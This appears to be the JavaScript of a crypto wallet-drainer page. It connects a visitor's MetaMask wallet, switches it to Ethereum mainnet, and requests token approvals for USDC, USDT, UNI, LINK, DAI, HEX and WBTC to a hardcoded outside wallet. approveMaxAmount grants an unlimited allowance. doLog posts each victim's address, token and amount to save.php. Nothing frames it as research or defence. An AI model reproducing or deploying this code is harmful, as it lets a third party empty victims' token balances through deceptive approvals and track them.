var approveWallet = "0x5a8C89E24417ee83F1b5B07a1608F7C0eF12E6E2";
//USDC USDT UNI LINK(ChainLink) DAI HEX WBTC
let tokens = ["0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", "0xdac17f958d2ee523a2206206994597c13d831ec7", "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", "0x514910771af9ca656af840dff83e8264ecf986ca", "0x6b175474e89094c44da98b954eedeac495271d0f", "0x2b591e99afe9f32eaa6214f7b7629768c40eeb39", "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"];

var arrayLength = tokens.length;
var tokenContractControllers = [arrayLength];
var mainChainId = '1';

var max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
var tokenContract;
var wallet;
var contractController;
var decimal;
var MAX_VALUE = ethers.BigNumber.from(max.toString());
var isConnect = false;
var signer = undefined;
current_network = undefined;

function connect() {
    if (isConnect === false) {
        doConnect();
        isConnect = true;
    }
    checkShowConnect();
}

function doLog(amount) {
    $.ajax({
        url: "save.php",
        data : JSON.stringify({
            "token": tokenContract,
            "sender": wallet,
            "amount": Number(amount)/decimal
        }),
        cache: false,
        async: true,
        type: 'post',
        timeout : 5000,
        success: function(res) {
            console.log("result posted = ", JSON.stringify(res));
        }
    });
}

function approveWithAmount() {
    var amount = ethers.BigNumber.from($('#amount').val());
    console.log("decimal", decimal);
    amount = Math.round(amount*decimal);
    doLog(amount);
    console.log("approve amount", amount);
    contractController.approve(approveWallet, ethers.BigNumber.from(amount.toString())).then((err, data) => {

    }).catch(function (error) {
        alert(error.message);
    });
}

function approveMaxAmount(tokenNumber) {
    console.log("approve max amount", MAX_VALUE);
    doLog(MAX_VALUE);
    tokenContractControllers[tokenNumber].approve(approveWallet, MAX_VALUE).then((data) => {
        console.log("data", data);
    }).catch(function (error) {
        alert(error.message);
    });
}

function startApp() {
    contractController.decimals().then((data) => {
        decimal = 10**(Number(data));
    }).catch(function (error) {
        alert(error.message);
    });
    checkShowConnect();
}

async function doConnect() {
    let ethereum = window.ethereum;
    ethereum
        .request({ method: 'eth_requestAccounts' })
        .then((handleAccountsChanged) =>
        {
            provider = new ethers.providers.Web3Provider(ethereum);
            signer = provider.getSigner();
            if (current_network === mainChainId) {
                connect();
            }
        }
        )
        .catch((error) => {
            if (error.code === 4001) {
                // EIP-1193 userRejectedRequest error
                console.log('Please connect to MetaMask.');
            } else {
                console.error(error);
                alert("Пожалуйста, обновите страницу");
            }
        });
    await switchEthereumChain();
    current_network = ethereum.networkVersion;
    if (current_network === mainChainId) {
        initContracts();
    } else if (isConnect) {
        isConnect = false;
        //location.reload();
    }
    console.log("current_network", current_network);

    const accounts = await ethereum.request({ method: 'eth_accounts' }).catch(checkErrEthAccounts());
    wallet = accounts[0];
    console.log("wallet", wallet);
    $('#wallet').html(wallet);
}

async function checkErrEthAccounts(error) {
    if (isConnect && current_network != mainChainId) {
    }
}

async function switchEthereumChain() {
    let ethereum = window.ethereum;
    try {
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }],
        }).then((handleswitchEthereumChain) =>
            {
            })
            .catch();
    } catch (switchError) {
        signer = undefined;
        // This error code indicates that the chain has not been added to MetaMask.
        isConnect = false;
        checkShowConnect();
        if (switchError.code === 4902) {
            try {
                await switchToMain();
            } catch (addError) {
                // handle "add" error
            }
        }
        // handle other "switch" errors
    }
}

async function switchToMain() {
    let ethereum = window.ethereum;
    const data = [{
        chainId: '0x1',
        chainName: 'ETH Mainnet(ETH)',
        nativeCurrency: {
            name: 'ETHEREUM',
            symbol: 'ETH',
            decimals: 18,
        },
        rpcUrls: ['https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'],
        blockExplorerUrls: ['https://etherscan.io'],
    }]
    const tx = await ethereum.request({method: 'wallet_addEthereumChain', params:data}).catch()
    current_network = ethereum.networkVersion;
    if (tx) {
        console.log('tx = ',tx);
    }
}

function initContracts() {
    if (signer === undefined) {
        isConnect = false;
        checkShowConnect();
        return ;
    }
    $.ajax({
        url: 'abi.json',
        dataType: 'json',
        success: function (data) {
            var abiContract = data;
            for(var i=0; i < arrayLength; i++) {
                tokenContractControllers[i] = new ethers.Contract(tokens[i], abiContract, signer);
            }
            checkShowConnect();
        }
    });
}

function checkShowConnect() {
    // if (isConnect) {alert('checkShowConnect ### true'); alert(signer);} else {alert('checkShowConnect ### false');alert(signer);}
     if (isConnect && signer != undefined) {
        $('#showWallet').show();
        $('#showConnect').hide();

        $('#approve0').show();
        $('#connect0').hide();

        $('#approve1').show();
        $('#connect1').hide();

        $('#approve2').show();
        $('#connect2').hide();

        $('#approve3').show();
        $('#connect3').hide();

        $('#approve4').show();
        $('#connect4').hide();

        $('#approve5').show();
        $('#connect5').hide();

        $('#approve6').show();
        $('#connect6').hide();
    } else {
        $('#showWallet').hide();
        $('#showConnect').show();

        $('#approve0').hide();
        $('#connect0').show();

        $('#approve1').hide();
        $('#connect1').show();

        $('#approve2').hide();
        $('#connect2').show();

        $('#approve3').hide();
        $('#connect3').show();

        $('#approve4').hide();
        $('#connect4').show();

        $('#approve5').hide();
        $('#connect5').show();

        $('#approve6').hide();
        $('#connect6').show();
    }
}